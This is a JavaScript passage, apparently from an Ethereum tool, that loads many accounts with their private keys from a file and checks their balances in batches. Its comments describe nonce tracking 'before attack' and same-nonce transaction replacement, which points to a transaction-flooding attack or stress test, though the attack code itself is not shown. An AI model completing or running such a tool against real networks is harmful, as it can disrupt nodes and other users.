function loadAccounts() {

    console.log(
        "\n============================================================"
    );

    console.log(
        "LOADING EXISTING ACCOUNTS"
    );

    console.log(
        "============================================================"
    );

    if (
        !fs.existsSync(
            ACCOUNTS_FILE
        )
    ) {

        throw new Error(
            `Account file not found: ${ACCOUNTS_FILE}`
        );
    }

    const stored =
        JSON.parse(
            fs.readFileSync(
                ACCOUNTS_FILE,
                "utf8"
            )
        );

    if (
        !Array.isArray(stored) ||
        stored.length === 0
    ) {

        throw new Error(
            "Account file is empty or invalid."
        );
    }

    const accounts =
        stored.map(
            (entry, index) => {

                if (
                    !entry.address ||
                    !entry.privateKey
                ) {

                    throw new Error(
                        `Invalid account at index ${index}`
                    );
                }

                return {

                    index:
                        entry.index ?? index,

                    address:
                        entry.address,

                    privateKey:
                        entry.privateKey,

                    // Read from network before attack.
                    nonce:
                        null,

                    // Current same-nonce replacement number.
                    submissionCount:
                        0,

                    // Incremented whenever nonce advances.
                    nonceCycle:
                        0,

                    // Prevent simultaneous recovery.
                    recoveringNonce:
                        false
                };
            }
        );

    console.log(
        `Loaded ${accounts.length} accounts.`
    );

    console.log(
        `File: ${ACCOUNTS_FILE}`
    );

    return accounts;
}

// ============================================================
// CHECK BALANCES
// ============================================================

async function checkAccountBalances(
    accounts
) {

    console.log(
        "\n============================================================"
    );

    console.log(
        "CHECKING ACCOUNT BALANCES"
    );

    console.log(
        "============================================================"
    );

    const BATCH_SIZE =
        100;

    let zeroBalance =
        0;

    let totalBalance =
        0n;

    for (
        let start = 0;
        start < accounts.length;
        start += BATCH_SIZE
    ) {

        const end =
            Math.min(
                start + BATCH_SIZE,
                accounts.length
            );

        const balances =
            await Promise.all(

                accounts
                    .slice(
                        start,
                        end
                    )
                    .map(
                        account =>
                            controlWeb3.eth
                                .getBalance(
                                    account.address
                                )
                    )
            );

        for (
            const balance of balances
        ) {

            const value =
                BigInt(balance);

            totalBalance +=
                value;

            if (
                value === 0n
            ) {

                zeroBalance++;
            }
        }

        console.log(
            `Checked balances ${end}/${accounts.length}`
        );
    }

    console.log(
        `Zero-balance accounts : ${zeroBalance}`
    );

    console.log(
        `Total account balance : ` +
        `${controlWeb3.utils.fromWei(
            totalBalance.toString(),
            "ether"
        )} ETH`
    );

    if (
        zeroBalance > 0
    ) {

        console.warn(
            `WARNING: ${zeroBalance} account(s) have zero balance.`
        );
    }
}

